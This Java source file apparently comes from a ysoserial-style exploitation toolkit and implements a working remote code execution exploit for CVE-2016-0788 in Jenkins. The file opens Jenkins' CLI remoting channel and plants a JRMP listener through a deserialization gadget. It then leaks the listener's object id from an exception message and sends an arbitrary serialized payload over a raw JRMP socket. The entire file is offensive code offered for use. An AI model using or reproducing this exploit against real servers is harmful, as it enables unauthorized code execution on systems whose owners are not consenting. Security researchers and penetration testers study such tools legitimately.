package com.h2tg.ysogate.server;


import hudson.remoting.Callable;
import hudson.remoting.Channel;
import hudson.remoting.JarLoader;
import com.h2tg.ysogate.Main;
import com.h2tg.ysogate.utils.Reflections;
import sun.rmi.server.Util;
import sun.rmi.transport.TransportConstants;
import com.h2tg.ysogate.payloads.gadgets.JRMPListener;
import javax.net.SocketFactory;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.lang.reflect.*;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.rmi.activation.ActivationDesc;
import java.rmi.activation.ActivationID;
import java.rmi.activation.ActivationInstantiator;


/**
 * CVE-2016-0788 exploit (1)
 * <p>
 * 1. delivers a com.h2tg.ysogate.payloads.JRMPListener payload to jenkins via it's remoting protocol.
 * 2. that payload causes the remote server to open up an JRMP listener (and export an object).
 * 3. connect to that JRMP listener and deliver any otherwise blacklisted payload.
 * <p>
 * Extra twist:
 * The well-known objects exported by the listener use the system classloader which usually
 * won't contain the targeted classes. Therefor we need to get ahold of the exported object's id
 * (which is using jenkins' classloader) that typically is properly randomized.
 * Fortunately - for the exploiting party - there is also a gadget that allows to leak
 * that identifier via an exception.
 *
 * @author mbechler
 */
@SuppressWarnings({
		"rawtypes", "restriction"
})
public class JenkinsListener {

	public static final void main(final String[] args) {

		if (args.length < 5) {
			System.err.println(JenkinsListener.class.getName() + " <jenkins_url> <args...> ");
			System.exit(-1);
		}

		String jenkinsUrl = args[0];
		int    jrmpPort   = 12345;

		Channel c = null;
		try {
			InetSocketAddress isa = JenkinsCLI.getCliPort(jenkinsUrl);
			c = JenkinsCLI.openChannel(isa);

			Object            call   = c.call(JenkinsCLI.getPropertyCallable(JarLoader.class.getName() + ".ours"));
			InvocationHandler remote = Proxy.getInvocationHandler(call);
			int               oid    = Reflections.getField(Class.forName("hudson.remoting.RemoteInvocationHandler"), "oid").getInt(remote);

			System.err.println("* JarLoader oid is " + oid);

			Object uro = new JRMPListener().getObject(String.valueOf(jrmpPort));

			Class<?> reqClass = Class.forName("hudson.remoting.RemoteInvocationHandler$RPCRequest");

			Object o = makeIsPresentOnRemoteCallable(oid, uro, reqClass);

			try {
				c.call((Callable<?, ?>) o);
			} catch (Exception e) {
				// [ActivationGroupImpl[UnicastServerRef [liveRef:
				// [endpoint:[172.16.20.11:12345](local),objID:[de39d9c:15269e6d8bf:-7fc1,
				// -9046794842107247609]]

				System.err.println(e.getMessage());

				parseObjIdAndExploit(args, jrmpPort, isa, e);
			}

		} catch (Throwable e) {
			e.printStackTrace();
		} finally {
			if (c != null) {
				try {
					c.close();
				} catch (IOException e) {
					e.printStackTrace(System.err);
				}
			}
		}

	}


	private static Object makeIsPresentOnRemoteCallable(int oid, Object uro, Class<?> reqClass)
			throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, ClassNotFoundException {
		Constructor<?> reqCons = reqClass.getDeclaredConstructor(int.class, Method.class, Object[].class);
		Reflections.setAccessible(reqCons);
		return reqCons
				.newInstance(oid, JarLoader.class.getMethod("isPresentOnRemote", Class.forName("hudson.remoting.Checksum")), new Object[]{
						uro,
				});
	}


	private static void parseObjIdAndExploit(final String[] args, int jrmpPort, InetSocketAddress isa, Exception e) throws Exception, IOException {
		String msg   = e.getMessage();
		int    start = msg.indexOf("objID:[");
		if (start < 0) {
			throw new Exception("Failed to get object id");
		}

		int sep = msg.indexOf(", ", start + 1);

		if (sep < 0) {
			throw new Exception("Failed to get object id, separator");
		}

		int end = msg.indexOf("]", sep + 1);

		if (end < 0) {
			throw new Exception("Failed to get object id, separator");
		}

		String uid    = msg.substring(start + 7, sep);
		String objNum = msg.substring(sep + 2, end);

		System.err.println("* UID is " + uid);
		System.err.println("* ObjNum is " + objNum);

		String[] parts = uid.split(":");

		long  obj = Long.parseLong(objNum);
		int   o1  = Integer.parseInt(parts[0], 16);
		long  o2  = Long.parseLong(parts[1], 16);
		short o3  = Short.parseShort(parts[2], 16);

		exploit(new InetSocketAddress(isa.getAddress(), jrmpPort), obj, o1, o2, o3, args);
	}


	private static void exploit(InetSocketAddress isa, long obj, int o1, long o2, short o3, String[] args)
			throws IOException {
		Socket           s   = null;
		DataOutputStream dos = null;
		try {
			System.err.println("* Opening JRMP socket " + isa);
			s = SocketFactory.getDefault().createSocket(isa.getAddress(), isa.getPort());
			s.setKeepAlive(true);
			s.setTcpNoDelay(true);

			OutputStream os = s.getOutputStream();
			dos = new DataOutputStream(os);

			dos.writeInt(TransportConstants.Magic);
			dos.writeShort(TransportConstants.Version);
			dos.writeByte(TransportConstants.SingleOpProtocol);

			dos.write(TransportConstants.Call);

			@SuppressWarnings("resource") final ObjectOutputStream objOut = new JRMPClient.MarshalOutputStream(dos);

			objOut.writeLong(obj);
			objOut.writeInt(o1);
			objOut.writeLong(o2);
			objOut.writeShort(o3);

			objOut.writeInt(-1);
			objOut.writeLong(Util.computeMethodHash(ActivationInstantiator.class.getMethod("newInstance", ActivationID.class, ActivationDesc.class)));

			// 去除前两个参数
			String[] newArray = new String[args.length - 2];
			System.arraycopy(args, 2, newArray, 0, newArray.length);

			Main.main(newArray);
			Object payloadObject = Main.PAYLOAD;

			objOut.writeObject(payloadObject);
			os.flush();
		} catch (Exception e) {
			e.printStackTrace(System.err);
		} finally {
			if (dos != null) {
				dos.close();
			}
			if (s != null) {
				s.close();
			}
		}
	}


}
